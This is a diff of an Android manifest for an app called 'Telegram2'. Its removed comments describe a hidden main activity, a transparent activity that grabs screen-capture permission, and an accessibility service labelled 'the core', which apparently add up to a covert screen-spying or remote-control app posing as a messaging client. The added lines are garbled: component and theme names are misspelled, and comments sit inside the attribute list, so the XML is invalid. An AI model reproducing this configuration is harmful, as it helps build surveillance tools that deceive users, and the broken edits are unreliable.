@@ -1,8 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
-<manifest xmlns:android="http://schemas.android.com/apk/res/android"
-    package="com.telegram2.messaging">
+<manifest xmlns:android="http://schemas.android.com/apk/res/android">
 
-    <!-- Essential permissions -->
     <uses-permission android:name="android.permission.INTERNET" />
     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
     <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>
@@ -17,15 +15,14 @@
     <application
         android:name=".Telegram2App"
         android:allowBackup="false"
-        android:icon="@mipmap/ic_launcher"
-        android:label="@string/app_name"
-        android:roundIcon="@mipmap/ic_launcher_round"
-        android:supportsRtl="true"
-        android:theme="@style/Theme.MyApp">
+        <!-- Use the default app theme that already exists in your project -->
+        android:theme="@android:style/Theme.Material.Light.NoActionBar"
+        <!-- Use only the basic ic_launcher, no round icon mystery -->
+        android:icon="@mipmp/ic_launcher"
+        android:label="@string/app_name">
 
-        <!-- Hidden main activity (for launching settings) -->
         <activity
-            android:name=".MainActivity"
+            android:name=".animActivity"
             android:exported="true">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
@@ -33,13 +30,11 @@
             </intent-filter>
         </activity>
 
-        <!-- Transparent activity that grabs MediaProjection permission -->
         <activity
-            android:name=".ScreenPermissionActivity"
-            android:theme="@android:style/Theme.Translucent.NoTitleBar"
+            android:name=".creenPermissionActivity"
+            android:theme="@android:style/Theme.ranslucent.NoTitleBar"
             android:exported="false" />
 
-        <!-- Accessibility Service (the core) -->
         <service
             android:name=".remote.MyAccessibilityService"
             android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
@@ -52,9 +47,8 @@
                 android:resource="@xml/accessibility_service_config" />
         </service>
 
-        <!-- Screen capture foreground service -->
         <service
-            android:name=".remote.ScreenCaptureService"
+            android:name=".remote.ScrenCaptureService"
             android:foregroundServiceType="mediaProjection"
             android:exported="false" />
 
